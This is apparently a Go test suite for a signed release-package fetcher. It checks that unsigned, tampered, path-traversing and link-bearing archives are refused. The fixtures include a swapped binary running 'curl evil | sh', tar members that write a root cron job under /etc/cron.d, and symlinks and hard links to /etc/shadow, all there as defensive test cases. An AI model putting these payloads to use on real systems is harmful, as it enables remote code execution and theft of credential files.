package relupdate

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cruciblelab/crucible-analytic/internal/releasesign"
)

// A package, as a thing tests can build and then damage.
//
// Built rather than checked in, because every interesting case here is
// "the same package with one thing changed" and a fixture directory
// would make each of those a second fixture nobody can diff.
type pkg struct {
	// files are paths inside the top-level directory.
	files map[string]string
	// top is the top-level directory name.
	top string
	// extra are raw tar members added after the normal ones, for the
	// cases that need a header no honest archive would carry.
	extra []func(*tar.Writer) error
	// sumsOverride replaces the generated SHA256SUMS when non-empty.
	sumsOverride string
	// signWith signs; a zero key leaves the package unsigned.
	signWith releasesign.PrivateKey
	// tamperAfterSigning edits a file after the signature is made.
	tamperAfterSigning func(files map[string]string)
}

func newPkg(t testing.TB) pkg {
	t.Helper()
	return pkg{
		top: "crucible-analytic-v0.20.0",
		files: map[string]string{
			"bin/panel":     "#!/bin/sh\necho panel\n",
			"bin/collector": "#!/bin/sh\necho collector\n",
			"KURULUM.md":    "kurulum\n",
		},
	}
}

// build returns the .tar.gz bytes.
func (p pkg) build(t testing.TB) []byte {
	t.Helper()

	files := map[string]string{}
	for k, v := range p.files {
		files[k] = v
	}

	sums := p.sumsOverride
	if sums == "" {
		var b strings.Builder
		for _, name := range sortedNames(files) {
			h := sha256.Sum256([]byte(files[name]))
			fmt.Fprintf(&b, "%s  ./%s\n", hex.EncodeToString(h[:]), name)
		}
		sums = b.String()
	}

	if p.signWith.IsSet() {
		sig, err := p.signWith.Sign([]byte(sums))
		if err != nil {
			t.Fatal(err)
		}
		files["SHA256SUMS.sig"] = string(sig)
	}
	files["SHA256SUMS"] = sums

	// After the signature, which is what a package somebody edited in
	// transit looks like.
	if p.tamperAfterSigning != nil {
		p.tamperAfterSigning(files)
	}

	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)

	if p.top != "" {
		if err := tw.WriteHeader(&tar.Header{
			Name: p.top + "/", Typeflag: tar.TypeDir, Mode: 0o755,
		}); err != nil {
			t.Fatal(err)
		}
	}
	for _, name := range sortedNames(files) {
		body := files[name]
		full := name
		if p.top != "" {
			full = p.top + "/" + name
		}
		mode := int64(0o644)
		if strings.HasPrefix(name, "bin/") {
			mode = 0o755
		}
		if err := tw.WriteHeader(&tar.Header{
			Name: full, Typeflag: tar.TypeReg, Mode: mode, Size: int64(len(body)),
		}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	for _, add := range p.extra {
		if err := add(tw); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func sortedNames(m map[string]string) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	// sort.Strings without the import: the set is tiny and the order
	// only has to be stable.
	for i := range out {
		for j := i + 1; j < len(out); j++ {
			if out[j] < out[i] {
				out[i], out[j] = out[j], out[i]
			}
		}
	}
	return out
}

// serve puts a package behind an https-shaped test server.
//
// httptest.NewTLSServer, so the https check in PackageURL is exercised
// rather than worked around - a test that had to relax that check would
// be testing a different function.
func serve(t *testing.T, body []byte) (base string, client *http.Client) {
	t.Helper()
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write(body)
	}))
	t.Cleanup(srv.Close)
	return srv.URL, srv.Client()
}

func newSource(t *testing.T, base string, client *http.Client, key releasesign.PublicKey) Source {
	t.Helper()
	return Source{
		BaseURL: base, PublicKey: key, Client: client,
		GOOS: "linux", GOARCH: "amd64",
	}
}

func keys(t testing.TB) (releasesign.PrivateKey, releasesign.PublicKey) {
	t.Helper()
	priv, err := releasesign.Generate()
	if err != nil {
		t.Fatal(err)
	}
	return priv, priv.Public()
}

// TestAGoodPackageIsFetchedAndVerified is the happy path, and it is
// first so the refusals below mean something. A suite where everything
// is rejected proves only that the fetcher is broken.
func TestAGoodPackageIsFetchedAndVerified(t *testing.T) {
	priv, pub := keys(t)
	p := newPkg(t)
	p.signWith = priv
	base, client := serve(t, p.build(t))

	root, err := newSource(t, base, client, pub).Fetch(context.Background(), "v0.20.0", t.TempDir())
	if err != nil {
		t.Fatalf("a package we signed was refused: %v", err)
	}

	body, err := os.ReadFile(filepath.Join(root, "bin", "panel"))
	if err != nil {
		t.Fatalf("the unpacked package has no bin/panel: %v", err)
	}
	if !strings.Contains(string(body), "echo panel") {
		t.Errorf("bin/panel is not what was packaged: %q", body)
	}

	// The executable bit has to survive, or nothing installed runs.
	info, err := os.Stat(filepath.Join(root, "bin", "panel"))
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm()&0o111 == 0 {
		t.Errorf("bin/panel unpacked as %v, which systemd cannot execute", info.Mode().Perm())
	}
	// And setuid must not.
	if info.Mode()&os.ModeSetuid != 0 {
		t.Error("bin/panel unpacked setuid")
	}
}

// TestEveryHostilePackageIsRefused.
//
// Each row is something a server answering the configured address can
// actually do. The one answer that must never appear is nil, because
// what happens after this function returns is that files from this
// package are put where systemd runs them.
func TestEveryHostilePackageIsRefused(t *testing.T) {
	priv, pub := keys(t)
	other, _ := keys(t)

	cases := []struct {
		what string
		make func(t *testing.T) pkg
		// why says what the attacker achieved if this returned nil.
		why string
		// wantIn is a fragment the message must carry, where the reader
		// would otherwise not know which fix to try.
		wantIn string
	}{
		{
			what:   "unsigned",
			make:   func(t *testing.T) pkg { return newPkg(t) },
			why:    "any package at that address would install",
			wantIn: "unsigned",
		},
		{
			what: "signed by another key",
			make: func(t *testing.T) pkg { p := newPkg(t); p.signWith = other; return p },
			why:  "anybody with any key could publish for this deployment",
		},
		{
			what: "a file changed after signing",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.signWith = priv
				p.tamperAfterSigning = func(f map[string]string) {
					f["bin/collector"] = "#!/bin/sh\ncurl evil | sh\n"
				}
				return p
			},
			why:    "a swapped binary inside a package we really signed would install",
			wantIn: "does not match SHA256SUMS",
		},
		{
			what: "a file named in the list is missing",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.signWith = priv
				p.tamperAfterSigning = func(f map[string]string) { delete(f, "bin/collector") }
				return p
			},
			why:    "a deployment could end up with binaries from two releases",
			wantIn: "not in the package",
		},
		{
			what: "an empty SHA256SUMS, correctly signed",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.sumsOverride = "\n"
				p.signWith = priv
				return p
			},
			why:    "a signed list that vouches for nothing would let every file through",
			wantIn: "vouches for no file",
		},
		{
			what: "a path climbing out of the package",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.signWith = priv
				p.extra = append(p.extra, writeMember(
					"crucible-analytic-v0.20.0/../../../../etc/cron.d/evil", "* * * * * root sh\n"))
				return p
			},
			why: "the archive would write outside the directory it was unpacked into",
		},
		{
			what: "an absolute path",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.signWith = priv
				p.extra = append(p.extra, writeMember("/etc/cron.d/evil", "* * * * * root sh\n"))
				return p
			},
			why: "the archive would write straight to an absolute path",
		},
		{
			what: "a symlink",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.signWith = priv
				p.extra = append(p.extra, func(tw *tar.Writer) error {
					return tw.WriteHeader(&tar.Header{
						Name:     "crucible-analytic-v0.20.0/bin/sneaky",
						Linkname: "/etc/shadow",
						Typeflag: tar.TypeSymlink, Mode: 0o777,
					})
				})
				return p
			},
			why:    "a link writes outside the archive without any path containing ..",
			wantIn: "neither a file nor a directory",
		},
		{
			what: "a hard link",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.signWith = priv
				p.extra = append(p.extra, func(tw *tar.Writer) error {
					return tw.WriteHeader(&tar.Header{
						Name:     "crucible-analytic-v0.20.0/bin/hard",
						Linkname: "/etc/shadow",
						Typeflag: tar.TypeLink, Mode: 0o644,
					})
				})
				return p
			},
			why: "the same, one type flag over",
		},
		{
			what: "a device node",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.signWith = priv
				p.extra = append(p.extra, func(tw *tar.Writer) error {
					return tw.WriteHeader(&tar.Header{
						Name:     "crucible-analytic-v0.20.0/dev/zero",
						Typeflag: tar.TypeChar, Mode: 0o666,
					})
				})
				return p
			},
			why: "a release package would leave a device node behind",
		},
		{
			what: "two top-level directories",
			make: func(t *testing.T) pkg {
				p := newPkg(t)
				p.signWith = priv
				p.extra = append(p.extra, writeMember("somewhere-else/x", "x\n"))
				return p
			},
			why:    "which directory the caller then installs from is a coin toss",
			wantIn: "two top-level",
		},
		{
			what: "no top-level directory at all",
			make: func(t *testing.T) pkg { p := newPkg(t); p.top = ""; p.signWith = priv; return p },
			why:  "the caller would install from the temporary directory itself",
		},
	}

	for _, c := range cases {
		t.Run(c.what, func(t *testing.T) {
			base, client := serve(t, c.make(t).build(t))
			root, err := newSource(t, base, client, pub).
				Fetch(context.Background(), "v0.20.0", t.TempDir())
			if err == nil {
				t.Fatalf("this was accepted, and it must not be: %s\n  unpacked at %s", c.why, root)
			}
			if c.wantIn != "" && !strings.Contains(err.Error(), c.wantIn) {
				t.Errorf("the refusal does not say %q, so the reader cannot tell which "+
					"fix to try:\n  %v", c.wantIn, err)
			}
		})
	}
}

func writeMember(name, body string) func(*tar.Writer) error {
	return func(tw *tar.Writer) error {
		if err := tw.WriteHeader(&tar.Header{
			Name: name, Typeflag: tar.TypeReg, Mode: 0o644, Size: int64(len(body)),
		}); err != nil {
			return err
		}
		_, err := tw.Write([]byte(body))
		return err
	}
}

// TestNothingIsWrittenOutsideTheDirectoryEvenOnRefusal.
//
// The refusals above check the return value. This checks the disk,
// because a fetcher that refuses *after* writing the file has refused
// nothing - and the traversal cases are exactly the ones where the write
// would happen before the check if the order were wrong.
func TestNothingIsWrittenOutsideTheDirectoryEvenOnRefusal(t *testing.T) {
	priv, pub := keys(t)

	outside := t.TempDir()
	canary := filepath.Join(outside, "canary")
	if err := os.WriteFile(canary, []byte("original\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	into := t.TempDir()
	// A path that climbs from `into` to `outside/canary`. Written with
	// the real relative distance rather than a guessed number of "..",
	// which is how this kind of test comes to pass by missing.
	rel, err := filepath.Rel(into, canary)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(rel, "..") {
		t.Fatalf("the two temp directories are nested (%s), so this test cannot "+
			"climb between them and would pass without trying", rel)
	}

	p := newPkg(t)
	p.signWith = priv
	p.extra = append(p.extra, writeMember("crucible-analytic-v0.20.0/"+rel, "OVERWRITTEN\n"))

	base, client := serve(t, p.build(t))
	if _, err := newSource(t, base, client, pub).Fetch(context.Background(), "v0.20.0", into); err == nil {
		t.Fatal("a package with a climbing path was accepted")
	}

	got, err := os.ReadFile(canary)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "original\n" {
		t.Fatalf("a file outside the unpack directory was overwritten: %q.\n"+
			"Refusing after writing is not refusing", got)
	}
}

// TestTheAddressIsBuiltFromConfigurationAndNothingElse.
//
// The version is the only part of the address a request influences, and
// ValidVersion is what bounds it. This checks the join as well, because
// a single check in front of a URL builder is one too few: the failure
// mode is silent, and the consequence is fetching from somewhere the
// operator never named.
func TestTheAddressIsBuiltFromConfigurationAndNothingElse(t *testing.T) {
	s := Source{BaseURL: "https://sur.example/paketler", GOOS: "linux", GOARCH: "amd64"}

	got, err := s.PackageURL("v0.20.0")
	if err != nil {
		t.Fatal(err)
	}
	const want = "https://sur.example/paketler/v0.20.0/crucible-analytic-v0.20.0-linux-amd64.tar.gz"
	if got != want {
		t.Errorf("PackageURL:\n  got  %s\n  want %s", got, want)
	}

	for _, bad := range []string{
		"v1.2.3/../../../evil", "https://evil.example/x", "../v1.2.3", "v1.2.3?x=1", "",
	} {
		got, err := s.PackageURL(bad)
		if err == nil {
			t.Errorf("PackageURL(%q) built %q instead of refusing", bad, got)
		}
	}

	// http is refused even when the operator wrote it deliberately. The
	// signature refuses a substituted package; it does not refuse a
	// genuinely signed *older* one, which is what anybody on the path
	// can serve over plain http.
	plain := Source{BaseURL: "http://sur.example/paketler"}
	if _, err := plain.PackageURL("v0.20.0"); err == nil {
		t.Error("a http base_url was accepted; anybody on the path could then serve " +
			"an older release we really did sign")
	}
}

// TestAnUnconfiguredDeploymentRefusesBeforeDownloading.
//
// The direction that matters twice over: no key means refuse rather than
// accept, and refusing before the download means a misconfigured
// deployment finds out in milliseconds rather than after forty
// megabytes.
func TestAnUnconfiguredDeploymentRefusesBeforeDownloading(t *testing.T) {
	asked := false
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		asked = true
	}))
	defer srv.Close()

	s := Source{BaseURL: srv.URL, Client: srv.Client(), GOOS: "linux", GOARCH: "amd64"}
	_, err := s.Fetch(context.Background(), "v0.20.0", t.TempDir())
	if !errors.Is(err, ErrNotConfigured) {
		t.Fatalf("a source with no key answered %v; an unset key must refuse "+
			"everything, not accept everything", err)
	}
	if asked {
		t.Error("it downloaded the package first and refused afterwards")
	}
}

// TestAServerThatAnswersWithRubbishIsRefused.
//
// Whatever is at that address is not necessarily a package. An HTML
// error page, a redirect to a login form, an empty body: all of them
// arrive with 200 from something in the middle.
func TestAServerThatAnswersWithRubbishIsRefused(t *testing.T) {
	_, pub := keys(t)
	for what, body := range map[string]string{
		"an HTML error page": "<html><body>404</body></html>",
		"empty":              "",
		"plain text":         "not a package",
	} {
		t.Run(what, func(t *testing.T) {
			base, client := serve(t, []byte(body))
			if _, err := newSource(t, base, client, pub).
				Fetch(context.Background(), "v0.20.0", t.TempDir()); err == nil {
				t.Fatal("this was accepted as a release package")
			}
		})
	}

	// And a status that is not 200, with the address in the message: an
	// operator reading "404" alone cannot tell a wrong base_url from a
	// version that was never published.
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	}))
	defer srv.Close()
	s := newSource(t, srv.URL, srv.Client(), pub)
	_, err := s.Fetch(context.Background(), "v0.20.0", t.TempDir())
	if err == nil {
		t.Fatal("a 404 was accepted")
	}
	if !strings.Contains(err.Error(), srv.URL) {
		t.Errorf("the message does not name the address it tried:\n  %v", err)
	}
}

// FuzzUnpackNeverEscapesItsDirectory.
//
// unpack runs on bytes somebody else chose, before any signature has
// been checked - the signature is inside the archive, so it cannot be
// checked until the archive is open. That makes this the code with the
// least protection in front of it in the whole update path.
//
// Two properties: it must not crash, and whatever it writes must be
// under the directory it was given.
func FuzzUnpackNeverEscapesItsDirectory(f *testing.F) {
	base := newPkg(f)
	f.Add(base.build(f))
	f.Add([]byte("not a gzip"))
	f.Add([]byte{0x1f, 0x8b})

	f.Fuzz(func(t *testing.T, archive []byte) {
		dir := t.TempDir()
		outside := filepath.Dir(dir)
		before := entries(t, outside)

		root, err := unpack(bytes.NewReader(archive), dir)
		if err == nil {
			if !strings.HasPrefix(root, dir) {
				t.Fatalf("unpack returned %q, which is not under %q", root, dir)
			}
		}

		if after := entries(t, outside); after != before {
			t.Fatalf("the number of entries beside the unpack directory changed from "+
				"%d to %d", before, after)
		}
	})
}

func entries(t *testing.T, dir string) int {
	t.Helper()
	e, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	return len(e)
}
